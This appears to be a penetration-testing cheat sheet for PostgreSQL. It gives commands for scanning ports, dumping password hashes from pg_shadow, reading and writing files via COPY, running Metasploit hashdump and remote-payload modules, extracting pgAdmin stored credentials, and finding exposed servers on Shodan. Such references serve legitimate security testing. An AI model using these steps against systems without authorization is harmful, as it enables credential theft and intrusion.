# PostgreSQL Pentesting Checklist & Commands

## üéØ What am I realistically expecting to find here?

‚≠ê After enumerating PostgreSQL (ports 5432, 5433), I realistically expect to find:

- [ ] Service version and configuration
- [ ] Database names and tables
- [ ] Usernames and password hashes
- [ ] Superuser or admin roles
- [ ] Ability to read or write files (with superuser)
- [ ] Possible RCE via untrusted code execution
- [ ] Password-based auth (md5/cleartext/crypt) in pg_hba.conf

---

## ‚úÖ PostgreSQL Pentest Checklist

- [ ] **Service Detection**
  - Confirm port open:
    ```
    nmap -sV -p 5432,5433 <IP>
    ```

---

- [ ] **Connect to Service**
  - Local:
    ```
    psql -U <username>
    ```
  - Remote:
    ```
    psql -h <host> -U <username> -d <database>
    psql -h <host> -p <port> -U <username> -W <database>
    ```

---

- [ ] **Interactive Commands in psql**
    ```sql
    \list                   -- List databases
    \c <database>           -- Connect to database
    \d                      -- List tables
    \du+                    -- Get users and roles
    SELECT datname FROM pg_database;
    SELECT usename, passwd FROM pg_shadow;
    SELECT current_setting('is_superuser');
    SELECT lanname,lanacl FROM pg_language WHERE lanname = 'plpgsql';
    ALTER USER user_name WITH PASSWORD 'new_password';
    SELECT grantee, privilege_type 
      FROM information_schema.role_table_grants 
      WHERE table_name='pg_shadow';
    ```

---

- [ ] **File Read / Write**
  - Read:
    ```sql
    CREATE TABLE demo(t text);
    COPY demo FROM '/path/to/file';
    SELECT * FROM demo;
    ```
  - Write ASCII data:
    ```sql
    COPY (SELECT convert_from(decode('<Base64>', 'base64'), 'utf-8')) 
      TO '/path/to/output/file.cmd';
    ```

---

- [ ] **User and Role Enumeration**
    ```sql
    SELECT 
      r.rolname, 
      r.rolsuper, 
      r.rolinherit,
      r.rolcreaterole,
      r.rolcreatedb,
      r.rolcanlogin,
      r.rolconnlimit, 
      r.rolvaliduntil,
      ARRAY(SELECT b.rolname
            FROM pg_catalog.pg_auth_members m
            JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid)
            WHERE m.member = r.oid) AS memberof,
      r.rolreplication
    FROM pg_catalog.pg_roles r
    ORDER BY 1;
    ```

---

## ‚úÖ Enumeration with Metasploit

- [ ] **Version & Injection**
    ```
    use auxiliary/scanner/postgres/postgres_version
    use auxiliary/scanner/postgres/postgres_dbname_flag_injection
    ```

- [ ] **Hash Dump & Schema Dump**
    ```
    use auxiliary/scanner/postgres/postgres_hashdump
    use auxiliary/scanner/postgres/postgres_schemadump
    ```

- [ ] **Read Files**
    ```
    use auxiliary/admin/postgres/postgres_readfile
    ```

- [ ] **Remote Payload Execution**
    ```
    use exploit/linux/postgres/postgres_payload
    use exploit/windows/postgres/postgres_payload
    ```

---

## ‚úÖ Config File for Auth Rules

- *pg_hba.conf* controls authentication:
  - Match on connection type, IP, database, user, auth method.
  - First matching rule applies (no fallthrough).
  - Auth methods:
    - md5 (hash)
    - crypt
    - password (cleartext)

---

## ‚úÖ Logging

- Enable in *postgresql.conf*:
    ```bash
    log_statement = 'all'
    log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'
    logging_collector = on
    sudo service postgresql restart
    ```
  - Logs usually in:
    ```
    /var/lib/postgresql/<version>/main/log/
    /var/lib/postgresql/<version>/main/pg_log/
    ```

---

## ‚úÖ pgAdmin Credentials

- **pgadmin4.db** file contains passwords:
    ```bash
    sqlite3 pgadmin4.db ".schema"
    sqlite3 pgadmin4.db "select * from user;"
    sqlite3 pgadmin4.db "select * from server;"
    strings pgadmin4.db
    ```
  - Decrypt using:
    - [pgadmin crypto.py](https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py)

---

## ‚úÖ Shodan Search

- [ ] Discover exposed PostgreSQL services:
    ```
    port:5432
    port:5433
    ```

---
